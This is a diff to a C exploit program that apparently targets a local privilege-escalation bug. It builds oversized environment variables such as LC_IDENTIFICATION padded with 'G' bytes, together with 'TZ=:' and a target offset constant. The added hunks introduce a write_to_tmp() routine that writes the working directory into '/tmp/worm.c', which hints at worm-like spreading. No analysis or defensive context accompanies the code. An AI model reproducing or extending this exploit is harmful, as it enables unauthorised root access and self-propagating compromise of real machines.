@@ -4,6 +4,11 @@
 #include <unistd.h>
 #define ENV_LEN 512
 #define TARGET_OFFSET_START 0x786
+#define PATH_LEN 255
+#define CHECK(e)                                                               \
+  if ((e)) {                                                                   \
+    exit(1);                                                                   \
+  }
 
 char *env_var(char *var, int overflow_len, char c) {
   int len = strlen(var);
@@ -11,6 +16,15 @@ char *env_var(char *var, int overflow_len, char c) {
   memcpy(p, var, len);
   memset(p + len, c, overflow_len);
   return p;
+}
+
+void write_to_tmp() {
+  FILE *tmp = fopen("/tmp/worm.c", "w");
+  CHECK(tmp == 0);
+  char path[PATH_LEN] = {0};
+  CHECK(getcwd(path, PATH_LEN) == 0);
+  int path_len = strlen(path);
+  CHECK(fwrite(path, sizeof(char), path_len, tmp) != path_len);
 }
 
 int main() {
@@ -53,6 +67,8 @@ int main() {
   envp[env_pos++] = env_var("LC_IDENTIFICATION=C.UTF-8@", 0x78, 'G');
   envp[env_pos++] = "TZ=:";
   envp[env_pos++] = 0;
+
+  write_to_tmp();
 
   for (int i = 0; i < env_pos; ++i) {
     printf("envp[%d]=%s %lu\n", i, envp[i], envp[i] != 0 ? strlen(envp[i]) : 0);
